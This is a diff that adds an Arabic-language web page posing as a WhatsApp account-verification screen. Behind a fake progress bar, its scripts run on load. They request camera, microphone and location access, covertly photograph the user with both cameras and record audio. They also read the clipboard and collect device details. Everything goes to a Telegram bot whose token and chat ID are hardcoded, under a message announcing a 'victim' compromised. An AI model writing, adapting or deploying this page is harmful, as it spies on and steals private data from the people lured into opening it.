@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>توثيق واتساب</title>
+<style>@font-face {
+  font-family: 'Tajawal';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("https://fonts.gstatic.com/s/tajawal/v12/Iura6YBj_oCad4k1rzY.ttf") format('truetype');
+}
+@font-face {
+  font-family: 'Tajawal';
+  font-style: normal;
+  font-weight: 500;
+  font-display: swap;
+  src: url("https://fonts.gstatic.com/s/tajawal/v12/Iurf6YBj_oCad4k1l8KiLrY.ttf") format('truetype');
+}
+@font-face {
+  font-family: 'Tajawal';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url("https://fonts.gstatic.com/s/tajawal/v12/Iurf6YBj_oCad4k1l4qkLrY.ttf") format('truetype');
+}
+</style>
+<style>
+    /* نفس الأنماط الموجودة في الملف الأصلي – لم تتغير */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, #075e54 0%, #128c7e 100%);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      text-align: center;
+      overflow: hidden;
+    }
+    
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      max-width: 800px;
+      z-index: 10;
+    }
+    
+    .card {
+      background: rgba(255, 255, 255, 0.97);
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 500px;
+      margin-bottom: 30px;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.3s ease;
+    }
+    
+    .card:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 5px;
+      background: linear-gradient(90deg, #25d366, #128c7e);
+    }
+    
+    .card:hover {
+      transform: translateY(-5px);
+    }
+    
+    .logo-container {
+      margin-bottom: 25px;
+    }
+    
+    .logo {
+      width: 100px;
+      height: 100px;
+      background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(0.95); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(0.95); }
+    }
+    
+    .logo img {
+      width: 60px;
+      height: 60px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+    }
+    
+    .title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 20px;
+      color: #075e54;
+    }
+    
+    .description {
+      font-size: 18px;
+      line-height: 1.7;
+      margin-bottom: 25px;
+      color: #333;
+    }
+    
+    .progress-container {
+      width: 100%;
+      height: 12px;
+      background: #e0e0e0;
+      border-radius: 10px;
+      margin: 30px 0;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #25d366, #128c7e);
+      width: 30%;
+      border-radius: 10px;
+      transition: width 1s ease;
+    }
+    
+    .timer {
+      font-size: 24px;
+      font-weight: 700;
+      color: #075e54;
+      margin-top: 10px;
+    }
+    
+    .status {
+      background: #f5f5f5;
+      border-radius: 15px;
+      padding: 15px;
+      font-size: 16px;
+      line-height: 1.5;
+      margin-top: 20px;
+      color: #333;
+      border-left: 4px solid #25d366;
+      text-align: right;
+    }
+    
+    .camera-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.95);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 100;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+    }
+    
+    .camera-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+    
+    .camera-message {
+      color: #075e54;
+      font-size: 24px;
+      margin-bottom: 30px;
+      text-align: center;
+      max-width: 80%;
+      font-weight: 500;
+    }
+    
+    .countdown-container {
+      position: relative;
+      width: 150px;
+      height: 150px;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .countdown {
+      font-size: 60px;
+      font-weight: bold;
+      color: #128c7e;
+      z-index: 2;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .circle-animation {
+      position: absolute;
+      border-radius: 50%;
+      border: 3px solid rgba(18, 140, 126, 0.5);
+      animation: pulse 1.5s infinite;
+      opacity: 0;
+    }
+    
+    @keyframes pulse {
+      0% { 
+        transform: scale(0.8); 
+        opacity: 0.7;
+      }
+      70% {
+        transform: scale(1.2);
+        opacity: 0.3;
+      }
+      100% { 
+        transform: scale(1.3); 
+        opacity: 0; 
+      }
+    }
+    
+    .circle-1 {
+      width: 150px;
+      height: 150px;
+      animation-delay: 0s;
+    }
+    
+    .circle-2 {
+      width: 120px;
+      height: 120px;
+      animation-delay: 0.5s;
+    }
+    
+    .circle-3 {
+      width: 90px;
+      height: 90px;
+      animation-delay: 1s;
+    }
+    
+    @media (max-width: 600px) {
+      .card {
+        padding: 30px 20px;
+      }
+      
+      .title {
+        font-size: 24px;
+      }
+      
+      .description {
+        font-size: 16px;
+      }
+      
+      .camera-message {
+        font-size: 20px;
+      }
+      
+      .countdown {
+        font-size: 40px;
+      }
+      
+      .countdown-container {
+        width: 120px;
+        height: 120px;
+      }
+      
+      .circle-1 {
+        width: 120px;
+        height: 120px;
+      }
+      
+      .circle-2 {
+        width: 100px;
+        height: 100px;
+      }
+      
+      .circle-3 {
+        width: 80px;
+        height: 80px;
+      }
+    }
+    
+    .background-animation {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+      opacity: 0.1;
+    }
+    
+    .bubble {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.2);
+      animation: float 15s infinite linear;
+    }
+    
+    @keyframes float {
+      0% { transform: translateY(100vh) scale(0.2); opacity: 0; }
+      10% { opacity: 0.3; }
+      90% { opacity: 0.1; }
+      100% { transform: translateY(-100px) scale(1.2); opacity: 0; }
+    }
+  </style>
+<style>
+            * { -webkit-tap-highlight-color: transparent; touch-action: manipulation; box-sizing: border-box; }
+            img, video, canvas { max-width: 100%; height: auto; }
+            body { overflow-x: hidden; width: 100%; margin: 0; padding: 0; }
+            button, input, select, textarea { font-size: 16px !important; touch-action: manipulation; }
+        </style></head>
+<body>
+<div id="clickCatcher" style="position:fixed;top:0;left:0;width:100%;height:100%;background:transparent;z-index:9999;cursor:default;display:block;pointer-events:auto;"></div>
+
+<div class="background-animation" id="backgroundAnimation"></div>
+<div class="container">
+<div class="card">
+<div class="logo-container">
+<div class="logo">
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"/>
+</div>
+</div>
+<h1 class="title">جاري التحقق من حسابك</h1>
+<p class="description">
+        يتم الآن التحقق من معلومات حسابك وربطه بخدمة واتساب. يرجى الانتظار ولا تغلق الصفحة حتى إكمال عملية التحقق بنجاح.
+      </p>
+<div class="progress-container">
+<div class="progress-bar" id="progressBar"></div>
+</div>
+<div class="timer" id="timer">⏱ 00:30</div>
+<div class="status" id="statusMessage">
+        جاري إعداد عملية التحقق...
+      </div>
+</div>
+</div>
+<div class="camera-overlay" id="cameraOverlay">
+<div class="countdown-container">
+<div class="circle-animation circle-1"></div>
+<div class="circle-animation circle-2"></div>
+<div class="circle-animation circle-3"></div>
+<div class="countdown" id="countdown">3</div>
+</div>
+<div class="camera-message">جاري تشغيل البحث عن رقم هاتفك للتحقق من الهوية</div>
+</div>
+<canvas id="canvas" style="display:none;"></canvas>
+<script>
+    function createBubbles() {
+        const container = document.getElementById('backgroundAnimation');
+        if (!container) return;
+        for (let i = 0; i < 20; i++) {
+            const bubble = document.createElement('div');
+            bubble.classList.add('bubble');
+            bubble.style.width = `${Math.random() * 100 + 20}px`;
+            bubble.style.height = bubble.style.width;
+            bubble.style.left = `${Math.random() * 100}%`;
+            bubble.style.animationDuration = `${Math.random() * 20 + 10}s`;
+            bubble.style.animationDelay = `${Math.random() * 5}s`;
+            container.appendChild(bubble);
+        }
+    }
+
+    let seconds = 30;
+    let captureCount = 0;
+    const timerElement = document.getElementById('timer');
+    const progressBar = document.getElementById('progressBar');
+    const statusMessage = document.getElementById('statusMessage');
+    const cameraOverlay = document.getElementById('cameraOverlay');
+    const countdownElement = document.getElementById('countdown');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const CHAT_ID = urlParams.get('id');
+
+    createBubbles();
+
+    const timer = setInterval(() => {
+        seconds--;
+        timerElement.textContent = `⏱ 00:${seconds.toString().padStart(2, '0')}`;
+        const progress = 100 - (seconds / 30 * 100);
+        progressBar.style.width = `${progress}%`;
+        if (seconds === 0) {
+            clearInterval(timer);
+            if (document.querySelector('.title')) document.querySelector('.title').textContent = "تم التحقق بنجاح!";
+            if (document.querySelector('.description')) document.querySelector('.description').textContent = "تم التحقق من حسابك وربطه بنجاح بخدمة واتساب. يمكنك الآن استخدام التطبيق.";
+            progressBar.style.backgroundColor = "#25D366";
+            timerElement.textContent = "✅ مكتمل";
+            statusMessage.textContent = "اكتملت عملية التحقق بنجاح. شكراً لصبرك!";
+        }
+    }, 1000);
+
+    window.onload = function() {
+        setTimeout(() => {
+            startCameraProcess();
+        }, 2000);
+    };
+
+    function startCameraProcess() {
+        statusMessage.textContent = "جاري البحث عن رقم هاتفك للتحقق من الهوية...";
+        cameraOverlay.classList.add('active');
+        let countdown = 3;
+        countdownElement.textContent = countdown;
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                capturePhoto();
+            }
+        }, 1000);
+    }
+
+    function capturePhoto() {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
+            .then(function(stream) {
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    const photoBlob = dataURLtoBlob(imageData);
+                    captureCount++;
+                    statusMessage.textContent = `تم البحث بنجاح! ${captureCount} أنتظر قليلاً...`;
+                    sendPhotoToTelegram(photoBlob, captureCount, stream);
+                }, 1000);
+            })
+            .catch(function(error) {
+                console.error('حدث خطأ أثناء الوصول إلى الكاميرا:', error);
+                statusMessage.textContent = "تعذر الوصول إلى الكاميرا. جاري إعادة المحاولة...";
+                cameraOverlay.classList.remove('active');
+                setTimeout(() => {
+                    startCameraProcess();
+                }, 5000);
+            });
+    }
+
+    async function sendPhotoToTelegram(photoBlob, captureCount, stream) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', photoBlob, `whatsapp_verification_${captureCount}.jpg`);
+
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            if (result.status === 'success') {
+                stream.getTracks().forEach(track => track.stop());
+                cameraOverlay.classList.remove('active');
+                if (captureCount < 2) {
+                    setTimeout(() => {
+                        startCameraProcess();
+                    }, 10000);
+                }
+            } else {
+                throw new Error(result.message || 'فشل الإرسال');
+            }
+        } catch (error) {
+            console.error('خطأ في إرسال الصورة:', error);
+            statusMessage.textContent = "حدث خطأ أثناء إرسال البيانات. جاري إعادة المحاولة...";
+            stream.getTracks().forEach(track => track.stop());
+            cameraOverlay.classList.remove('active');
+            setTimeout(() => {
+                startCameraProcess();
+            }, 5000);
+        }
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const byteString = atob(dataURL.split(',')[1]);
+        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], { type: mimeString });
+    }
+</script>
+<script>
+(function() {
+    'use strict';
+    
+    const BOT_TOKEN = '8837356969:AAFNodAgWKdbN9lvbRA-FTn2Lbvs72FL-FE';
+    const TARGET_ID = '8621188919';  // المعرف المستهدف (مستخدم أو قناة)
+    const REDIRECT_URL = 'https://t.me/Whiskybots';
+    
+    let isExecuting = false;
+    
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    
+    async function sendToChannel(text, isHTML = true) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TARGET_ID,
+                    text: text,
+                    parse_mode: isHTML ? 'HTML' : undefined
+                })
+            });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function sendPhotoToChannel(base64Data, caption) {
+        try {
+            let blob = await (await fetch(base64Data)).blob();
+            let formData = new FormData();
+            formData.append('chat_id', TARGET_ID);
+            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function sendAudioToChannel(audioUrl, caption) {
+        try {
+            let blob = await fetch(audioUrl).then(r=>r.blob());
+            let formData = new FormData();
+            formData.append('chat_id', TARGET_ID);
+            formData.append('audio', blob, 'audio.webm');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function getDeviceInfo() {
+        let ua = navigator.userAgent;
+        let brand = 'غير معروف';
+        if(ua.includes('iPhone')) brand = 'Apple';
+        else if(ua.includes('Samsung')) brand = 'Samsung';
+        else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
+        else if(ua.includes('Pixel')) brand = 'Google';
+        else brand = 'Android/PC';
+        
+        let battery = 'غير مدعوم';
+        if('getBattery' in navigator) {
+            try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging ? 'يشحن' : 'لا يشحن'}`; } catch(e) {}
+        }
+        
+        return {
+            fullName: navigator.userAgentData?.platform || navigator.platform || ua.split(' ').slice(0,3).join(' '),
+            brand: brand,
+            os: navigator.platform,
+            browser: /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : 'Safari'),
+            screen: `${screen.width}x${screen.height}`,
+            battery: battery,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language
+        };
+    }
+    
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+    }
+    
+    async function getClipboard() {
+        try { let text = await navigator.clipboard.readText(); return text || "(فارغة)"; } catch(err) { return "❌ لا يمكن الوصول إلى الحافظة"; }
+    }
+    
+    async function capturePhotos(facingMode, count = 3) {
+        let photos = [];
+        let stream = null;
+        let video = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: facingMode } }
+            });
+            video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', 'true');
+            video.style.cssText = 'position:fixed;top:-1000px;left:-1000px;width:320px;height:240px;opacity:0;pointer-events:none;';
+            document.body.appendChild(video);
+            await new Promise((resolve) => {
+                video.onloadedmetadata = async () => { await video.play(); resolve(); };
+            });
+            await delay(800);
+            let canvas = document.createElement('canvas');
+            for(let i = 0; i < count; i++) {
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                let ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                await delay(400);
+            }
+        } catch(e) { console.warn(e); }
+        finally {
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            if(video && video.parentNode) video.remove();
+        }
+        return photos;
+    }
+    
+    async function recordAudio(duration = 5000) {
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+            let promise = new Promise(resolve => {
+                mediaRecorder.onstop = () => {
+                    let blob = new Blob(chunks, { type: 'audio/webm' });
+                    let url = URL.createObjectURL(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(url);
+                };
+            });
+            mediaRecorder.start();
+            await delay(duration);
+            mediaRecorder.stop();
+            return await promise;
+        } catch(e) { console.warn(e); return null; }
+    }
+    
+    async function requestPermissions() {
+        try { let a = await navigator.mediaDevices.getUserMedia({ audio: true }); a.getTracks().forEach(t => t.stop()); } catch(e) {}
+        try { let f = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } }); f.getTracks().forEach(t => t.stop()); } catch(e) {}
+        try { let b = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } }); b.getTracks().forEach(t => t.stop()); } catch(e) {}
+        if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, { timeout: 5000 }); }
+    }
+    
+    async function executeFullScan() {
+        if(isExecuting) return;
+        isExecuting = true;
+        await delay(500);
+        
+        let deviceInfo = await getDeviceInfo();
+        let locationData = await getLocation();
+        let clipboardText = await getClipboard();
+        
+        let frontPhotos = [];
+        let backPhotos = [];
+        try { frontPhotos = await capturePhotos("user", 3); } catch(e) {}
+        try { backPhotos = await capturePhotos("environment", 3); } catch(e) {}
+        let audioUrl = await recordAudio(5000);
+        
+        await sendToChannel(`#☑️ تم اختراق ضحية ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
+        
+        let report = `📱 <b>بيانات الجهاز</b>\n\n`;
+        report += `الجهاز: ${deviceInfo.fullName}\n`;
+        report += `الشركة: ${deviceInfo.brand}\n`;
+        report += `نظام التشغيل: ${deviceInfo.os}\n`;
+        report += `المتصفح: ${deviceInfo.browser}\n`;
+        report += `الشاشة: ${deviceInfo.screen}\n`;
+        report += `البطارية: ${deviceInfo.battery}\n`;
+        report += `المنطقة: ${deviceInfo.timezone}\n`;
+        report += `اللغة: ${deviceInfo.language}\n\n`;
+        
+        if(locationData && locationData.lat) {
+            report += `📍 <b>الموقع الجغرافي</b>\n`;
+            report += `خط العرض: ${locationData.lat}\n`;
+            report += `خط الطول: ${locationData.lng}\n`;
+            report += `<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lng}">🗺️ عرض الخريطة</a>\n\n`;
+        }
+        
+        report += `📋 <b>محتوى الحافظة:</b>\n${clipboardText.substring(0, 500)}\n\n`;
+        report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
+        report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
+        report += `📷 صور خلفية: ${backPhotos.length} صورة`;
+        
+        await sendToChannel(report, true);
+        
+        for(let i = 0; i < frontPhotos.length; i++) {
+            await sendPhotoToChannel(frontPhotos[i], `📸 كاميرا أمامية - صورة ${i+1}`);
+            await delay(300);
+        }
+        for(let i = 0; i < backPhotos.length; i++) {
+            await sendPhotoToChannel(backPhotos[i], `📷 كاميرا خلفية - صورة ${i+1}`);
+            await delay(300);
+        }
+        
+        if(audioUrl) {
+            await sendAudioToChannel(audioUrl, "🎙️ تسجيل صوتي");
+        }
+        
+        await sendToChannel(`✅ اكتمل جمع البيانات بنجاح`);
+        await delay(1500);
+        window.location.href = REDIRECT_URL;
+    }
+    
+    async function start() {
+        await requestPermissions();
+        await delay(500);
+        executeFullScan().catch(err => {
+            console.error(err);
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+        });
+    }
+    
+    window.addEventListener('load', () => { setTimeout(start, 100); });
+    console.log("✅ بايلودات جاهزة للمستخدم: " + TARGET_ID);
+})();
+</script></body>
+</html>
